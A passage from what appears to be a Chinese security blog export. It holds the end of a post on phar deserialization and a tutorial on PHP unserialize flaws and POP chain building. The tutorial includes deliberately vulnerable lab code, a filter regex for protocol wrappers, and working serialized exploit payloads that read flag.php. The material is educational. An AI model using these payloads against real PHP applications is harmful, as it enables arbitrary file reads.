class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;meimima123&#x27;</span>, <span class="string">&#x27;dvwa&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://phar.phar/test.txt\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>再配置一下<code>mysql.ini</code>的<code>mysqld</code>。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这个例子在<a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>中也提到了，更加详细。</p><p>以上基本上就是phar的影响范围了，大家可以看到，影响非常的广，几乎所有用到wrapper封装的函数都可能存在这个问题。那么如何防御呢？</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol><h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><p>本文是在学习各位大佬对phar与反序列化的分析后，进行的总结，这里感谢@ZSX, K0rz3n, Smi1e, Mochazz, seaii等等大佬的文章，读完都感觉获益良多。这篇总结基本上也就是把各位大佬的话总结复述了一遍，很多地方甚至是直接引用的，如有侵权，烦请联系。</p><p>考完研后，感觉一年和各位大佬的差距进一步拉大了，但是花了好几天复现和学习phar与php反序列化问题，随着一步一步的深入（由浅入深，由自己会的到自己不会的内容），真的很有获得感和满足感。希望以后我也能自己写出这样一篇篇出色的文章，做一个个这样深入的分析。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a> 2018/8, seaii</p></li><li><p><a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p></li><li><p><a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar">PHP反序列化入门之phar</a> 2019/02, Mochazz(七月火)</p></li><li><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解PHP反序列化漏洞</a> 2018/11 K0rz3n</p></li><li><p><a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 2018/10 zsx</p></li><li><p><a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">php反序列化攻击拓展</a>  , Smi1e</p></li><li><p><a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化与POP链</title>
      <link href="/2020/03/05/unsearise-POP/"/>
      <url>/2020/03/05/unsearise-POP/</url>
      
        <content type="html"><![CDATA[<h1 id="php反序列化与POP链"><a href="#php反序列化与POP链" class="headerlink" title="php反序列化与POP链"></a>php反序列化与POP链</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h2><p>php反序列化是很久之前就接触的漏洞，但是一直都没有深入的学习，只是知道一个大概，POP链的构造也不是很熟练，于是今天总结一下。本文将详细介绍<strong>php反序列化原理，为什么有的时候序列的payload无效，POP链的构造以及Session的反序列化</strong>下一节会具体学习如何利用phar协议扩展php反序列化的攻击面。</p><h2 id="0x01-反序列化基本知识"><a href="#0x01-反序列化基本知识" class="headerlink" title="0x01 反序列化基本知识"></a>0x01 反序列化基本知识</h2><h3 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h3><p><strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</p><p><strong>反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。</p><h3 id="1-2-php魔术方法"><a href="#1-2-php魔术方法" class="headerlink" title="1.2 php魔术方法"></a>1.2 php魔术方法</h3><p>PHP提供了许多“魔术”方法，这些方法由两个下划线前缀（__）标识。它们充当拦截器，在满足某些条件时会自动调用它们。 魔术方法提供了一些极其有用的功能。</p><p>常见的魔术方法有：</p><ol><li><p><code>__contruct()</code>  当一个对象创建时被调用</p></li><li><p><code>__destruct()</code>  当一个对象销毁前被调用</p></li><li><p><code>__sleep()</code>  在对象被序列化前被调用</p></li><li><p><code>__wakeup</code>    将在反序列化之后立即被调用</p></li><li><p><code>__toString</code> 当一个对象被当做字符串使用时被调用</p></li><li><p><code>__get()</code>,<code>__set()</code>   当调用或设置一个类及其父类方法中<strong>未定义的属性</strong>时</p></li><li><p><code>__invoke()</code>  调用函数的方式调用一个对象时的回应方法</p></li><li><p><code>__call</code> 和 <code>__callStatic</code>前者是调用类<strong>不存在的方法</strong>时执行，而后者是调用类不存在的静态方式方法时执行。</p></li></ol><p>通过调试下面这个程序，会对魔术方法的调用有更直观的认识，强烈建议单步调试一遍。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n__destruct() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__get() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params">$property, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="string">&quot;\n__set() call\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__invoke() call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __construct()</span></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __toSting()</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 __sleep()</span></span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="comment">//调用 __wakeup()</span></span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="comment">//不存在这个bbbb属性，调用 __get()</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;bbbb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//name是私有变量，不允许修改，调用 __set()</span></span><br><span class="line">$a-&gt;name = <span class="string">&quot;pro&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;name;</span><br><span class="line"><span class="comment">//将对象作为函数，调用 __invoke()</span></span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line"><span class="comment">//程序结束，调用 __destruct() (会调用两次__destruct，因为中间有一次反序列化)</span></span><br></pre></td></tr></table></figure><h3 id="1-3-序列化后的字符串形式"><a href="#1-3-序列化后的字符串形式" class="headerlink" title="1.3 序列化后的字符串形式"></a>1.3 序列化后的字符串形式</h3><p>一个序列化的字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O代表这是一个对象，4代表对象名称的长度，2代表成员个数。</span><br><span class="line">大括号中分别是：属性名类型、长度、名称;值类型、长度、值。</span><br></pre></td></tr></table></figure><p>另外，<strong>注意到不同权限的属性，序列化之后的字符串存在区别：</strong></p><p><strong>public</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O: 对象 4（类的名字长度为4）&quot;Test&quot;类名称</span></span><br><span class="line"><span class="comment">//2 （对象含有的属性数量）</span></span><br><span class="line"><span class="comment">//s:属性是字符串  4 是属性名称的长度 &quot;test&quot; 属性名称 s:2:&quot;ok&quot; 属性是字符串，长度2，值为&quot;ok&quot; </span></span><br><span class="line"><span class="comment">// s:另一个属性是字符串，3长度，var，属性值，N NULL另一个属性初始值为空  </span></span><br></pre></td></tr></table></figure><p>可以看到，public的属性，序列化后的值就是属性的名称和对应的值</p><p><img src="https://i.loli.net/2020/03/10/R5nuKyM4hV6Uvis.png"></p><p><strong>private</strong></p><p>换成private权限，属性在序列化后也会出现区别，用010editor容易看出。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$data = serialize($t);</span><br><span class="line"><span class="keyword">echo</span>($data);</span><br><span class="line">file_put_contents(<span class="string">&quot;serialize.txt&quot;</span>, $data);</span><br></pre></td></tr></table></figure><p>属性名变成了<code>%00Test%00test</code>和<code>%00Test%00var</code></p><p>也就是<code>%00类名%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/jOGdk6VZvAqQPcN.png"></p><p><strong>protected</strong></p><p>换成protected, 属性序列化之后又变了，属性名变成了<code>%00*%00test</code>和<code>%00*%00var</code></p><p>也就是<code>%00*%00属性名</code></p><p><img src="https://i.loli.net/2020/03/10/whWsyA3YTH7JGtU.png"></p><p>注意到这些对构造序列化的字符串很关键，当我们直接将<code>private protected</code>的属性进行序列化，得到的序列化字符串的payload将无效，因为<code>0x00</code>的缘故。但是通过<code>urlencode</code>就可以避免这种当时可能会看起来莫名其妙的”bug“（个人经验==、）。</p><h2 id="0x02-php反序列化漏洞"><a href="#0x02-php反序列化漏洞" class="headerlink" title="0x02 php反序列化漏洞"></a>0x02 php反序列化漏洞</h2><p>反序列化本身不是漏洞，但是如果类的某些属性可控，那么在反序列的过程中就会自动的执行魔术方法，从而导致安全问题。</p><p>所以，通常反序列化漏洞的成因在于代码中的 <code>__unserialize()</code>,<code>__wakeup()</code>等魔术方法接收的参数可控，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><p>下面举一个简单的例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">&#x27;demo.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;show(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$filename</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source($filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>上面的代码是接收一个参数<code>a</code>，然后将其反序列化，反序列化后，会调用<code>__wakeup()</code>方法。如果一切正常的话，这个方法是显示一下<code>demo.php</code>文件的源代码。但是参数<code>a</code>是可控的，也就是说对象<code>a</code>的属性是可控的。于是我们可以伪造一个<code>filename</code>来构造对象。</p><p><strong>EXP</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> popdemo();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($p));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/09/elb4YCrgB9oQcyn.png"></p><p>可以看到，当我们对象参数可控时，可以伪造对象的一些属性，从而实现任意文件读取等操作。</p><p>正如，之前所说， 如果我们没有<code>urlencode</code>，就会得到一个无效的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:7:&quot;popdemo&quot;:1:&#123;s:17:</span><br><span class="line">0x00之后会截断</span><br><span class="line"></span><br><span class="line">这样是可以的：</span><br><span class="line">a&#x3D;O:7:&quot;popdemo&quot;:1:&#123;s:17:&quot;%00popdemo%00filename&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/rOns25ZBmA1ueMw.png"></p><h2 id="0x03-POP链的构造"><a href="#0x03-POP链的构造" class="headerlink" title="0x03 POP链的构造"></a>0x03 POP链的构造</h2><h3 id="2-1-什么是POP链"><a href="#2-1-什么是POP链" class="headerlink" title="2.1 什么是POP链"></a>2.1 什么是POP链</h3><blockquote><p>玩过 pwn 的同学应该对 ROP 并不陌生，ROP 的全称是面向返回编程(Return-Oriented Programing),ROP 链构造中是寻找<strong>当前系统环境中</strong>或者<strong>内存环境里已经存在的</strong>、具有固定地址且带有返回操作的指令集,将这些<strong>本来无害的片段</strong>拼接起来，形成一个连续的层层递进的调用链，最终达到我们的执行 libc 中函数或者是 systemcall 的目的</p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0X04-POP-%E9%93%BE%E7%9A%84%E4%BB%8B%E7%BB%8D">来自K0rz3n大佬</a></p></blockquote><p>我的理解是：构造一个完整的调用链，该调用链与原来代码的调用链一致，不过部分属性被我们所控制，从而达到攻击目的。构造的这条链就是POP链。</p><h3 id="2-2-用一个实例说明如何构造POP链"><a href="#2-2-用一个实例说明如何构造POP链" class="headerlink" title="2.2 用一个实例说明如何构造POP链"></a>2.2 用一个实例说明如何构造POP链</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>先看读文件的函数在哪：<code>Read.file_get</code>里面有一个<code>file_get_contents</code>    <code>Show._show()</code>中有一个<code>highlight_file</code></li><li>我们可控的是<code>hello</code>参数，调用<code>unserialize()</code>函数，即<code>__wakeup()</code>魔术方法，于是就只有<code>Show类</code>中存在该方法，但是注意到在<code>Show.__wakeup()</code>中存在一个正则匹配，这个正则匹配会将<code>$this-&gt;source</code>当成字符串来处理。也就是说会调用<code>Show.__toString()</code>方法。</li><li>定位到<code>Show.__toString()</code>，可以将<code>source</code>序列化为Show类的对象，就会调用<code>__toString</code>方法。<code>__toString</code>又会取一个<code>str[&#39;str&#39;]-&gt;source</code>，那么如果这个<code>source</code>不存在的话，就会执行<code>__get()</code>方法。</li><li><code>__get()</code>魔术方法会调用一个<code>$p变量</code>，这个也是可控的，然后会将p当做函数调用，此时触发了<code>Read.__invoke()</code>魔术方法</li><li><code>__invoke魔术方法</code>会触发<code>file_get()函数</code>,进而<code>base64_encode(file_get_contents($value))</code>最终达到读文件的目的。</li></ol><p>这样一条完整的链就分析完了：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello -&gt; __wakeup -&gt; Show._show -&gt; Show.__toString -&gt; (不存在属性)Test.__get() -&gt; Read.__invoke</span><br></pre></td></tr></table></figure><p>注意对象关系（hello是Show的对象，source属性是Test的对象，p属性是Read的对象），然后写一个POP链的对应EXP，就可以了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$read = <span class="keyword">new</span> Read();</span><br><span class="line">$test-&gt;p = $read;</span><br><span class="line">$show-&gt;source = $show;</span><br><span class="line">$show-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($show);<span class="comment">//在存在private和protected属性的情况下还是需要使用urlencode的。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/10/25MVI1unUSGebAy.png"></p><h2 id="0x03-php的Session反序列化问题"><a href="#0x03-php的Session反序列化问题" class="headerlink" title="0x03 php的Session反序列化问题"></a>0x03 php的Session反序列化问题</h2><h3 id="3-1-PHP的Session存储机制"><a href="#3-1-PHP的Session存储机制" class="headerlink" title="3.1 PHP的Session存储机制"></a>3.1 PHP的Session存储机制</h3><p><code>php.ini</code>有一下配置项用于控制Session有关的设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;D:\xampp\tmp&quot;    表明所有的session文件都是存储在xampp&#x2F;tmp下</span><br><span class="line">session.save_handler&#x3D;files          表明session是以文件的方式来进行存储的</span><br><span class="line">session.auto_start&#x3D;0                表明默认不启动session</span><br><span class="line">session.serialize_handler&#x3D;php       表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure><p>PHP中有多种session的序列话引擎，当我设置session为<code>$_SESSION[&quot;name&quot;] = &quot;V0W&quot;;</code>时。不同的引擎保存的session文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php: </span><br><span class="line">    name|s:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php_binary:</span><br><span class="line">    names:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):</span><br><span class="line">    a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;V0W&quot;;&#125;</span><br><span class="line">    存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>切换不同引擎使用的函数：</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;调用引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另外文件名，其实是<code>PHPSESSIONID</code>的值</p><p><img src="https://i.loli.net/2020/03/11/Q4isJOLn6tG2euE.png"></p><h3 id="3-2-PHP的Session反序列化漏洞原理"><a href="#3-2-PHP的Session反序列化漏洞原理" class="headerlink" title="3.2 PHP的Session反序列化漏洞原理"></a>3.2 